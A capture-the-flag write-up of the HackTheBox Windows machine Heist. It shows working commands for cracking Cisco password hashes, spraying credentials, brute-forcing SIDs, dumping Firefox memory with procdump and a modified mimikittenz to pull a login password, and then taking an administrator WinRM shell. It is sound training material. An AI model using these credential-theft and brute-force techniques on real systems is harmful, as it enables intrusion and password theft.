---
title: HTB: Heist
url: https://0xdf.gitlab.io/2019/11/30/htb-heist.html
date: 2019-11-30T13:45:00+00:00
difficulty: Easy [20]
os: Windows
tags: ctf, hackthebox, htb-heist, nmap, cisco, john, cisco-type-7, smbclient, smbmap, crackmapexec, rpcclient, ipc, lookupsid, evil-winrm, powershell, docker, firefox, procdump, out-minidump, mimikittenz, credentials
---

![Heist](https://0xdfimages.gitlab.io/img/heist-cover.png)

Heist brought new concepts I hadn’t seen on HTB before, yet keep to the easy difficulty. I’ll start by find a Cisco config on the website, which has some usernames and password hashes. After recovering the passwords, I’ll find that one works to get RPC access, which I’ll use to find more usernames. One of those usernames with one of the original passwords works to get a WinRM session on the Heist. From there, I’ll notice that Firefox is running, and dump the process memory to find the password for the original website, which is also the administrator password for the box.

## Box Info

| Name | [Heist](https://hackthebox.com/machines/heist)  [Heist](https://hackthebox.com/machines/heist) [Play on HackTheBox](https://hackthebox.com/machines/heist) |
| --- | --- |
| Release Date | [10 Aug 2019](https://twitter.com/hackthebox_eu/status/1159390983244656641) |
| Retire Date | 30 Nov 2019 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Heist |
| Radar Graph | Radar chart for Heist |
| First Blood User | 00:38:54[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 01:38:41[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creator | [MinatoTW MinatoTW](https://app.hackthebox.com/users/8308) |

## Recon

### nmap

`nmap` shows a handful of Windows ports, HTTP (TCP 80), RPC (TCP 135, 49669), SMB (TCP 445), and WinRM (TCP 5985):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.149
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-20 19:10 EDT
Nmap scan report for 10.10.10.149
Host is up (0.42s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 21.59 seconds
root@kali# nmap -sC -sV -p 80,135,445,5985,49669 -oA scans/nmap-tcpscripts 10.10.10.149
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-20 19:11 EDT
Nmap scan report for 10.10.10.149
Host is up (0.20s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-08-20 19:12:23
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.83 seconds

```

Based on the [IIS Version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions), it looks like Windows 10 / Server 2016 / Server 2019.

### Website - TCP 80

The site offers a login page:

![1566496780358](https://0xdfimages.gitlab.io/img/1566496780358.png)

I don’t have creds, but there’s a “Login as guest” link. I’ll click it, and I’m taken to an issues page:

![1566496808075](https://0xdfimages.gitlab.io/img/1566496808075.png)

A user named hazard is seeking help about this Cisco router. I can view the config by clicking on the “Attachment” link:

```

version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh

```

### Cracking Passwords

#### Overview

In the Cisco config, there are 3 different hashes of two different types, each of which are described in [this paper](https://pen-testing.sans.org/resources/papers/gcih/cisco-ios-type-7-password-vulnerability-100566):

| Hash | Hash Type |
| --- | --- |
| `enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91` | Cisco Type 5 salted md5 |
| `username rout3r password 7 0242114B0E143F015F5D1E161713` | Cisco Type 7 Custom, reversible |
| `username admin privilege 15 password 7 02375012182C1A1D751618034F36415408` |

#### Type 5

The type 5 password can be decrypted with `john`:

```

root@kali# /opt/john/run/john --wordlist=/usr/share/wordlists/rockyou.txt level5_hash                                                                                                      
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 256/256 AVX2 8x3])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)
1g 0:00:00:15 DONE (2019-08-20 19:54) 0.06631g/s 232443p/s 232443c/s 232443C/s steaua17..steall3
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

I’ll start a list of passwords, and add “stealth1agent” to it.

#### Type 7

There are [online tools to crack type 7 hashes](http://www.firewall.cx/cisco-technical-knowledgebase/cisco-routers/358-cisco-type7-password-crack.html), but it’s more interesting to understand what’s going on. The [paper I mentioned above](https://pen-testing.sans.org/resources/papers/gcih/cisco-ios-type-7-password-vulnerability-100566) goes into detail as to how the Type 7 scheme works. Basically, string in the config is hex characters. The first two characters is the offset into the static key to start at (indexed starting at one, eww). The rest are the hex bytes that when xored by successive characters from the password, produce the plaintext password. The static encryption key is “tfd;kfoA,.iyewrkldJKD”.

So if I start with “0242114B0E143F015F5D1E161713”, I know the password is 13 characters long. I also know that the first byte is 2, so start at the second letter in the key, `f`. Then xor it with the next hex byte, `42` to get `$`:

```

root@kali# python3
Python 3.7.3 (default, Apr  3 2019, 05:39:12)
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> chr(ord('f') ^ int('42',16))
'$'

```

I wrote a quick `python` script to decrypt it (and there are tons available on the internet):

```

#!/usr/bin/env python3

import sys
from binascii import unhexlify

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} [level 7 hash]")
    exit()

static_key = "tfd;kfoA,.iyewrkldJKD"
enc = sys.argv[1]
start = int(enc[:2], 16) - 1
enc = unhexlify(enc[2:])
key = static_key[start:] + static_key[:start]

plain = ''.join([chr(x ^ ord(key[i % len(key)]))  for i, x in enumerate(enc)])
print(plain)

```

I can get the two from the config:

```

root@kali# ./cisco_de7.py 0242114B0E143F015F5D1E161713
$uperP@ssword
root@kali# ./cisco_de7.py 02375012182C1A1D751618034F36415408
Q4)sJu\Y8qz*A3?d

```

Two more passwords. I’ve got a list of three passwords, and a list of three user names:

```

root@kali# cat passwords 
stealth1agent
$uperP@ssword
Q4)sJu\Y8qz*A3?d
root@kali# cat users 
rout3r
admin
hazard

```

### SMB - TCP 445

#### Initial Enum

I start with the typical `smbmap` call:

```

root@kali# smbmap -H 10.10.10.149
[+] Finding open SMB ports....
[!] Authentication error occurred
[!] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
[!] Authentication error on 10.10.10.149

```

No permissions. I try adding a bad username and password just to be sure, but same results. I’ll also check `smbclient` just in case:

```

root@kali# smbclient -N -L //10.10.10.149
session setup failed: NT_STATUS_ACCESS_DENIED

```

#### With Creds

Now I’ll try with the credentials I’ve gathered. [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-Credentials) is a great tool here. I can give it a list of username and passwords, and let it tell me which one worked:

```

root@kali# crackmapexec smb 10.10.10.149 -u users -p passwords 
CME          10.10.10.149:445 SUPPORTDESK     [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SUPPORTDESK)
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\rout3r:stealth1agent STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\rout3r:$uperP@ssword STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\admin:stealth1agent STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\admin:$uperP@ssword STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
CME          10.10.10.149:445 SUPPORTDESK     [+] SUPPORTDESK\hazard:stealth1agent 
[*] KTHXBYE!

```

It will stop once it finds one. If you want it to continue, there’s a `--continue-on-success` flag in newer versions than the one on kali.

I’ll re-run `smbmap` with creds. hazard can only access `IPC$`:

```

root@kali# smbmap -H 10.10.10.149 -u hazard -p stealth1agent
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.149...
[+] IP: 10.10.10.149:445        Name: 10.10.10.149                                      
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        C$                                                      NO ACCESS
        IPC$                                                    READ ONLY

```

I would go back and re-run `crackmapexec`, but I already saw all three passwords fail with the two other users. I’ll also try to connect over WinRM with these creds, but it fails.

#### rpcclient

`IPC$` is a share [used for interprocess communications](http://smallvoid.com/article/winnt-ipc-share.html). Typically `IPC$` is known for accecpting null (unauthenticated) sessions, but in this case, I needed credentials to read from it.

As I can read `IPC$`, I can connect with `rpcclient`:

```

root@kali# rpcclient -U 'hazard%stealth1agent' 10.10.10.149
rpcclient $> 

```

I can use the `lookupnames` command to get the SIDs of the users I know:

```

rpcclient $> lookupnames hazard
hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
rpcclient $> lookupnames administrator
administrator S-1-5-21-4254423774-1266059056-3197185112-500 (User: 1)
rpcclient $> lookupnames rout3r
result was NT_STATUS_NONE_MAPPED
rpcclient $> lookupnames admin
result was NT_STATUS_NONE_MAPPED

```

I can also look up accounts by SID:

```

rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)

```

I’ll brute force across a bunch of SIDs in a loop to get a list of all users. If I run `rpcclient` with a `-c`, I can offer a command from the command line:

```

root@kali# rpcclient -U 'hazard%stealth1agent' 10.10.10.149 -c 'lookupsids S-1-5-21-4254423774-1266059056-3197185112-1000'
S-1-5-21-4254423774-1266059056-3197185112-1000 *unknown*\*unknown* (8)

```

I’ll start at 1000 and work up to 1050, using `grep` to remove the unknowns:

```

root@kali# for i in {1000..1050}; do rpcclient -U 'hazard%stealth1agent' 10.10.10.149 -c "lookupsids S-1-5-21-4254423774-1266059056-3197185112-$i" | grep -v unknown; done
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)
S-1-5-21-4254423774-1266059056-3197185112-1009 SUPPORTDESK\support (1)
S-1-5-21-4254423774-1266059056-3197185112-1012 SUPPORTDESK\Chase (1)
S-1-5-21-4254423774-1266059056-3197185112-1013 SUPPORTDESK\Jason (1)

```

There’s also an impacket tool, `lookupsids.py`, which does this faster and cleaner:

```

root@kali# lookupsid.py hazard:stealth1agent@10.10.10.149
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)

```

## Shell as chase

### Manually

When I originally solved Heist, I took these new user names and my list of passwords, and I used [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to try connecting as each with different passwords. When I got to chase / ‘Q4)sJu\Y8qz\*A3?d’, it connected:

```

root@kali# ruby /opt/evil-winrm/evil-winrm.rb -i 10.10.10.149 -u SUPPORTDESK\\chase -s ~/pshs/ -p 'Q4)sJu\Y8qz*A3?d'

Info: Starting Evil-WinRM shell v1.6

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chase\Documents>

```

Note, with `evil-winrm`, I give it a scripts directory and an exes directory.

And I can grab `user.txt`:

```
*Evil-WinRM* PS C:\Users\Chase\desktop> cat user.txt
a127daef************************

```

### Script It

That was a fair amount of guessing, and I am much happier if I can script something, even if just in a console, to do the brute force for me. Because getting better at PowerShell is on my to-do list, I decided to try that.

I’ll start a PowerShell docker container, using `-v` to mount my current directory with my passwords list into `/opt`:

```

root@kali# docker run -v $(pwd):/opt/heist -it quickbreach/powershell-ntlm
PowerShell 6.1.1
Copyright (c) Microsoft Corporation. All rights reserved.

https://aka.ms/pscore6-docs
Type 'help' to get help.

PS />

```

Now, I’ll write a loop to try each of the passwords I’ve collected with WinRM with the new user, Chase:

```

PS /opt/heist> foreach($pass in cat ./passwords) {  
>>     $user = "chase"
>>     $secstr = New-Object -TypeName System.Security.SecureString
>>     $pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
>>     $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
>>     $res = New-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $cred -ErrorAction SilentlyContinue
>>     if($res -ne $null) {
>>         echo "[+] Found password: $pass"
>>         Enter-PSSession $res
>>     } else {
>>         echo "[-] Password failed: $pass"
>>     }
>> }
[-] Password failed: stealth1agent
[-] Password failed: $uperP@ssword
[+] Found password: Q4)sJu\Y8qz*A3?d
[10.10.10.149]: PS C:\Users\Chase\Documents> whoami
supportdesk\chase

```

The first line just loops over the lines in my password file. The next four lines set up the Windows credential object. The fifth line tries to create a PSSession using the credential. Then there’s a branch. If success, print message and connect. Otherwise, alert to failure, and continue.

## Priv to administrator

### Enumeration

#### login.php

Looking around on the box, there’s not a ton of stuff I can access. But if I go back to the source code for `\inetpub\wwwroot\login.php`, I see it’s a hardcoded administrator password:

```

<?php                                                                                                                       
session_start();                                                 
if( isset($_REQUEST['login']) && !empty($_REQUEST['login_username']) && !empty($_REQUEST['login_password'])) {                                                      
        if( $_REQUEST['login_username'] === 'admin@support.htb' && hash( 'sha256', $_REQUEST['login_password']) === '91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040') {
                $_SESSION['admin'] = "valid";
                header('Location: issues.php');                           
        }                                                                                                                                                              
        else                                                      
                header('Location: errorpage.php');
}                                                 
else if( isset($_GET['guest']) ) {                                                                                    
        if( $_GET['guest'] === 'true' ) {
                $_SESSION['guest'] = "valid";
                header('Location: issues.php');                                            
        }                       
}

?>    

```

The password hash is a SHA256. `john` runs all of `rockyou` in a second, but doesn’t find a match:

```

root@kali# /opt/john/run/john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt sha256_admin_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=3
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2019-08-23 02:52) 0g/s 9078Kp/s 9078Kc/s 9078KC/s $$m4hid$$..*7¡Vamos!
Session completed

```

#### Request Format

While I’m here, I’ll check out what a POST request to login to the page looks like. I’ll make sure I’m running through burp, and login with dummy creds:

```

POST /login.php HTTP/1.1
Host: 10.10.10.149
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.149/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Cookie: PHPSESSID=v3bm1dd6r11s1f7dcu7j4p6h4g
Connection: close
Upgrade-Insecure-Requests: 1

login_username=0xdf%40htb&login_password=bad-password&login=

```

#### todo.txt

I also checked out files in chase’s home directory. I typically start by excluding `appdata` from the search:

```
*Evil-WinRM* PS C:\> cmd /c dir /s /b /a:-d-h \Users\chase | findstr /i /v appdata
C:\Users\chase\Desktop\todo.txt
C:\Users\chase\Desktop\user.txt
C:\Users\chase\Favorites\Bing.url
C:\Users\chase\Links\Desktop.lnk
C:\Users\chase\Links\Downloads.lnk

```

`todo.txt` is interesting:

```
*Evil-WinRM* PS C:\> type \Users\chase\Desktop\todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.

```

There’s three items here. The first implies that chase will keep checking the website to watch the issues list. The third implies that the guest user doesn’t have the access that some other use will have (I saw about that user is admin@support.htb). The second is likely the issue that came from the support ticket I saw earlier.

How would chase check the issues list? With a browser. I’ll also notice that multiple instances of `firefox` are in the process list:

```
*Evil-WinRM* PS C:\> get-process firefox
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    358      26    16332     279920       0.73   6252   1 firefox
   1138      71   141448     476008      42.98   6440   1 firefox
    341      19    10176     264104       0.80   6564   1 firefox
    407      31    17392     293212       3.86   6796   1 firefox
    390      36    78456     341504      67.70   7104   1 firefox   

```

I also see a profile in chase’s `appdata` directory:

```
*Evil-WinRM* PS C:\users\chase\appdata\roaming\Mozilla\Firefox\Profiles> ls

    Directory: C:\users\chase\appdata\roaming\Mozilla\Firefox\Profiles

Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
d-----        8/23/2019  12:38 PM                77nc64t5.default

```

### Get Creds from Firefox

I’ll show a few different ways to do this.

#### procdump / Out-Minidump

I’ll grab `procdump64.exe` from the [sysinternals tools page](https://live.sysinternals.com/), and upload it to Heist:

```
*Evil-WinRM* PS C:\Users\Chase\Documents> upload ~/exes/procdump64.exe .
Info: Uploading ~/exes/procdump64.exe to .

Data: 455560 bytes of 455560 bytes copied

Info: Upload successful!

```

Now I’ll run it on one of the pids for `firefox` from above:

```
*Evil-WinRM* PS C:\Users\Chase\Documents> .\procdump64 -ma 6252 -accepteula

ProcDump v9.0 - Sysinternals process dump utility
Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[02:54:30] Dump 1 initiated: C:\Users\Chase\Documents\firefox.exe_190823_025430.dmp
[02:54:30] Dump 1 writing: Estimated dump file size is 280 MB.
[02:54:32] Dump 1 complete: 281 MB written in 2.1 seconds
[02:54:33] Dump count reached.

```

Alternatively, I could create the same dump using [PowerSploit’s](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1) `Out-Minidump`:

```
*Evil-WinRM* PS C:\users\chase\appdata\local\temp> Out-Minidump.ps1
*Evil-WinRM* PS C:\users\chase\appdata\local\temp> menu

   ___ __ __  ____  _
  /  _]  |  ||    || |
 /  [_|  |  | |  | | |
|    _]  |  | |  | | |___
|   [_|  :  | |  | |     |
|     |\   /  |  | |     |
|_____| \_/  |____||_____|

 __    __  ____  ____   ____   ___ ___
|  |__|  ||    ||    \ |    \ |   |   |
|  |  |  | |  | |  _  ||  D  )| _   _ |
|  |  |  | |  | |  |  ||    / |  \_/  |
|  `  '  | |  | |  |  ||    \ |   |   |
 \      /  |  | |  |  ||  .  \|   |   |
  \_/\_/  |____||__|__||__|\_||___|___|

                           By: CyberVaca@HackPlayers

[+] Invoke-Binary
[+] l04d3r-LoadDll
[+] Out-Minidump
*Evil-WinRM* PS C:\users\chase\appdata\local\temp> get-process -id 6252 | Out-Minidump

    Directory: C:\users\chase\appdata\local\temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/23/2019  11:09 PM      286666409 firefox_6252.dmp

```

Now I’ll download the dump:

```
*Evil-WinRM* PS C:\Users\Chase\Documents> download firefox.exe_190823_025430.dmp
Info: Downloading firefox.exe_190823_025430.dmp to firefox.exe_190823_025430.dmp

Info: Download successful!

```

Now I’ll look for any POST requests in memory using `grep` and the format I found above:

```

root@kali# grep -aoE 'login_username=.{1,20}@.{1,20}&login_password=.{1,50}&login=' firefox.exe_190823_025430.dmp 
login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=

```

The options on `grep` are:
- `-a` - Process a binary file as if it were text.
- `-o` - Print only the matched (non-empty) parts of a matching line
- `-E` - Interpret PATTERNS as extended regular expressions

I’ll use a regex where I look for a basic email address as the `login_username`, and a 1-50 character password.

I’ve got a password there. I can check, and it does match the hash from the source code:

```

root@kali# echo -n '4dD!5}x/re8]FBuZ' | sha256sum 
91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040  -

```

#### MimiKittenz

[Mimikittenz](https://github.com/putterpanda/mimikittenz) is a tool that will look into the memory of user space processes and look for passwords. By default, it checks IE, Chrome, and Firefox for POST requests that match common webmail, social media, and other sites. I can drop it in the scripts directory for my `evil-winrm` connection, then read it into my session, and run it. But it won’t find anything:

```

root@kali# ruby /opt/evil-winrm/evil-winrm.rb -i 10.10.10.149 -u SUPPORTDESK\\chase -s ~/pshs/ -p 'Q4)sJu\Y8qz*A3?d'                                                                                                                           

Info: Starting Evil-WinRM shell v1.6

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chase\Documents> Invoke-mimikittenz.ps1
*Evil-WinRM* PS C:\Users\Chase\Documents> menu

   ___ __ __  ____  _
  /  _]  |  ||    || |
 /  [_|  |  | |  | | |
|    _]  |  | |  | | |___
|   [_|  :  | |  | |     |
|     |\   /  |  | |     |
|_____| \_/  |____||_____|

 __    __  ____  ____   ____   ___ ___
|  |__|  ||    ||    \ |    \ |   |   |
|  |  |  | |  | |  _  ||  D  )| _   _ |
|  |  |  | |  | |  |  ||    / |  \_/  |
|  `  '  | |  | |  |  ||    \ |   |   |
 \      /  |  | |  |  ||  .  \|   |   |
  \_/\_/  |____||__|__||__|\_||___|___|

                           By: CyberVaca@HackPlayers

[+] Invoke-Binary
[+] Invoke-mimikittenz
[+] l04d3r-LoadDll
*Evil-WinRM* PS C:\Users\Chase\Documents> Invoke-mimikittenz
───▐▀▄──────▄▀▌───▄▄▄▄▄▄▄─────────────
───▌▒▒▀▄▄▄▄▀▒▒▐▄▀▀▒██▒██▒▀▀▄──────────
──▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄────────
──▌▒▒▒▒▒▒▒▒▒▒▒▒▒▄▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄──────
▀█▒▒█▌▒▒█▒▒▐█▒▒▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌─────
▀▌▒▒▒▒▒▀▒▀▒▒▒▒▒▀▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐───▄▄
▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌▄█▒█
▐▒▒▒▒mimikittenz-1.0-alpha▒▒▒▒▒▒▒▒▒▐▒█▀─
▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐▀───
▐▒▒▒▒▒▒CAN I HAZ WAM?▒▒▒▒▒▒▒▒▒▒▒▒▌────
─▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐─────
─▐▒▒▒jamieson@dringensec.com▒▒▒▒▌─────
──▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐──────
──▐▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▌──────
────▀▄▄▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀────────
*Evil-WinRM* PS C:\Users\Chase\Documents>

```

That’s because I want to catch chase logging into Heist, not Gmail or GitHub or any well known site. I’ll create a copy of the `ps1` file, and scroll to the bottom. I’ll add a regex based on the Heist POST request:

```

    # HTB-Heist
    [mimikittenz.MemProcInspector]::AddRegex("Heist","login_username=.{1,20}@.{1,20}&login_password=.{1,50}&login=")

```

Also, I’ll edit the line towards the end to tell it to just look at firefox, removing IE and Chrome:

```

$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("firefox")

```

Now, I’ll upload that to a new session of `evil-winrm`, and run it:

```

root@kali# ruby /opt/evil-winrm/evil-winrm.rb -i 10.10.10.149 -u SUPPORTDESK\\chase -s ~/pshs/ -p 'Q4)sJu\Y8qz*A3?d'                                                            

Info: Starting Evil-WinRM shell v1.6

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chase\Documents> Invoke-mimikittenz-heist.ps1
*Evil-WinRM* PS C:\Users\Chase\Documents> Invoke-mimikittenz
───▐▀▄──────▄▀▌───▄▄▄▄▄▄▄─────────────
───▌▒▒▀▄▄▄▄▀▒▒▐▄▀▀▒██▒██▒▀▀▄──────────
──▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄────────
──▌▒▒▒▒▒▒▒▒▒▒▒▒▒▄▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄──────
▀█▒▒█▌▒▒█▒▒▐█▒▒▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌─────
▀▌▒▒▒▒▒▀▒▀▒▒▒▒▒▀▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐───▄▄
▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌▄█▒█
▐▒▒▒▒mimikittenz-1.0-alpha▒▒▒▒▒▒▒▒▒▐▒█▀─
▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐▀───
▐▒▒▒▒▒▒CAN I HAZ WAM?▒▒▒▒▒▒▒▒▒▒▒▒▌────
─▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐─────
─▐▒▒▒jamieson@dringensec.com▒▒▒▒▌─────
──▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▐──────
──▐▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▌──────
────▀▄▄▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀▀▀▀▀▀▄▄▀────────

PatternName PatternMatch
----------- ------------
Heist       login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=

```

I get the password!

#### Find in Session Data

Rather than dumping memory, I can look in the user’s session data. I’ll start by finding the Firefox profile. In this case, there’s only one:

```

[10.10.10.149]: PS C:\Users\Chase\appdata\roaming\mozilla\firefox\profiles> dir

    Directory: C:\Users\Chase\appdata\roaming\mozilla\firefox\profiles

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/26/2019  11:35 PM                77nc64t5.default 

```

In the profile folder, there’s a folder named `sessionstore-backups`. Sometimes after a while there will be session data backed up in this folder. On a reset, it’s empty. When there is session data, I can find it with:

```

[10.10.10.149]: PS C:\Users\Chase\appdata\roaming\mozilla\firefox\profiles\77nc64t5.default\sessionstore-backups> Get-ChildItem -path . -recurse -file | select-string password

```

### Shell as administrator

The password for the site is reused as the administrator password for the box, so I can just connect with `evil-winrm`:

```

root@kali# ruby /opt/evil-winrm/evil-winrm.rb -i 10.10.10.149 -u SUPPORTDESK\\administrator -s . -e . -p '4dD!5}x/re8]FBuZ'                                                                

Info: Starting Evil-WinRM shell v1.6

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

And get `root.txt`:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
50dfa3c6************************

```